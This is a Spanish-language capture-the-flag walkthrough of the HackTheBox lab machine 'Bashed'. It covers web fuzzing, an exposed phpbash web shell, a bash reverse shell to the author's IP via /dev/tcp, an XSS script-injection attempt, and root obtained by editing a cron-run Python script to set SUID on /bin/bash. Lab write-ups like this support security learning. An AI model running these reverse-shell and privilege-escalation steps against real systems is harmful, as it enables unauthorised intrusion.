10.10.10.68
-----------

Esta máquina solo tiene el purto 80 abierto (http):
```console
└─$ whatweb http://10.10.10.68
http://10.10.10.68 [200 OK] Apache[2.4.18], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.68], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
```

La web habla de una aplicacion que permite ejecutar comandos en consola *"phpbash"*. El unico enlace que da util
es a */single.html* que tiene una foto de esa aplicacion ejecutandose bajo la ruta /uploads/phpbash.php en otra
ip (10.10.10.27).

En nuestra maquina no existe esa ruta pero si /uploads, pero haciendo fuzzing no he dado con nada. El codigo
fuente de /uplads no tiene nada.

Haciendo fuzzing por rutas php
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.68/FUZZ.php

000001476:   200        0 L      0 W        0 Ch        "config"
000045226:   403        11 L     32 W       290 Ch      "http://10.10.10.68/.php"
```
El config php no tiene nada, sera idea de fuzzear parametros.
```console
└─$ wfuzz -c --hc=404 -t 200 --hl=0 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt "http://10.10.10.68/config.php?FUZZ=whoami";
```
Pero una vez mas no hay suerte. 

Fuzzing normal:
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.68/FUZZ

000000324:   301        9 L      28 W       308 Ch      "php"                                                
000000002:   301        9 L      28 W       311 Ch      "images"                                             
000000536:   301        9 L      28 W       308 Ch      "css"                                                
000000820:   301        9 L      28 W       308 Ch      "dev"                                                
000000939:   301        9 L      28 W       307 Ch      "js" 
```


Este main.js nos habla de una ruta /php/sendMail.php a la que por POST y varios parametros. (La ruta /php tiene
directory listing y solo tiene este sendMail)
```js
'action': 'SendMessage',
'name': jQuery('#name').val(),
'email': jQuery('#contact-email').val(),
'subject': jQuery('#subject').val(),
'message': jQuery('#message').val()
```
Aparte de esto tiene un amplio codigo en patrones regez para que el correo tenga un formato correcto, por lo que
en ese campo tampoco se puede colar nada.
Si conseguimos mandar un email y que alguien lo vea, podemos hacer un ataque XSS. Como son muchos parametros,
se me hace mas comodo usar python.

```python
import requests

main_url = "http://10.10.10.68/php/sendMail.php"
data = {
    'action': 'SendMessage',
    'name': 'cucuxii',
    'email': 'cucuxii@mail.htb',
    'subject': 'test',
    'message': 'test'
}

req = requests.post(main_url, data)
print(req.status_code)
print(req.text)
```
La espuesta es un json '{"ResponseData":"Message Sent"}'. Parece que estamos haciendo la peticion bien.
Intente hacer un ataque XSS poniendo tanto en subject como en message ```<script src="http://10.10.14.7:8000">```
y ponerme en escucha por un servidor de python pero no resultó.

La ruta /dev tiene tanto phpbash como phpbash.min.php (version reducida?)
Esta utilidad nos da una consola, le metemos el clasico comando de reverse shell:
```bash -c 'bash -i >& /dev/tcp/10.10.14.8/443 0>&1'``` no funciona asi que urlencodeas los "&" a "%26" y ahi si.

Vamos a enumerar el sistema con mi script (lo deposite en /tmp con wget a mi ip y cambie el /usr/bin/bash
a /bin/bash):

- usaurios: root arrexel scriptmanager
- SUIDS -> /bin/ntfs-3g y /usr/bin/sudo (no se si es version vulnerable)
- sudo no password -> (scriptmanager : scriptmanager) NOPASSWD: ALL

A parte de eso nada mas, es un sistema relativamente vacio.
El scriptamanager es un usaurio y podemos ejecutar a nombre de el cualquier cosa segun esto:
```console
www-data@bashed:/tmp$ sudo -u scriptmanager whoami
scriptmanager
www-data@bashed:/tmp$ sudo -u scriptmanager bash
scriptmanager@bashed:/tmp$ 
```
Este chaval tiene el script "/scripts/test.py". Junto a eso hay un test.txt con la palabra "testing 123!" que
supongo será una contraseña, no me sirve para migrar al arrexel (pero su directorio /home tiene permisos
de lectura y eso me permitio leer su flag)

En cuanto a la ruta /scripts, root posee el test.txt pero el script test.py es del scriptmanager pero parece que
es quien ha escrito lo que pone en test.txt (que es de root). Aunque el script no sea de root, si este lo ejecuta
mediante cron cada poco tiempo, nos puede permitir escalar privilegios. Eso se comprueba al borrar el test.txt
y ver que pasado cierto rato vuelve a existir.
Otra cosa esque la fecha de test.py es 2017 mientras que la de test.txt es la actual.

He modifcado el script para que nos haga una bash SUID
```console
import os
os.system("chmod u+s /bin/bash")
```
Ahora 

```console
scriptmanager@bashed:/scripts$ bash -p
bash-4.3# whoami
root
```













